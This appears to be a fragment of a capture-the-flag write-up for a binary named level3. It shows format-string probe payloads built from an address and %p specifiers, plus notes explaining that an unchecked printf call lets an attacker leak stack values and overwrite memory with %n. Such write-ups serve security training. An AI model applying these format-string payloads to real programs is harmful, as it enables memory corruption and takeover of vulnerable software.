objdump -t ./level3 | grep "m"

\x8c\x98\x04\x08 %4$p %519$p %520$p %521$p %522$p %523$p %524$p %525$p %526$p %527$p %528$p

AAAA %4$p %519$p %520$p %521$p %522$p %523$p %524$p %525$p %526$p %527$p %528$p

![](./resources/protections_level3.png)
```
lets check the binary using gdb
```
![](./resources/functions.png)
```
main makes a simple call to the function v() lets disassemble it
```
![](./resources/v_function.png)
```
the function v is calling printf without a format string which is unsafe since we can start popping items from stack till we find where our input will be stored then we can use the %n modifiers to modify the value at the defined element
```
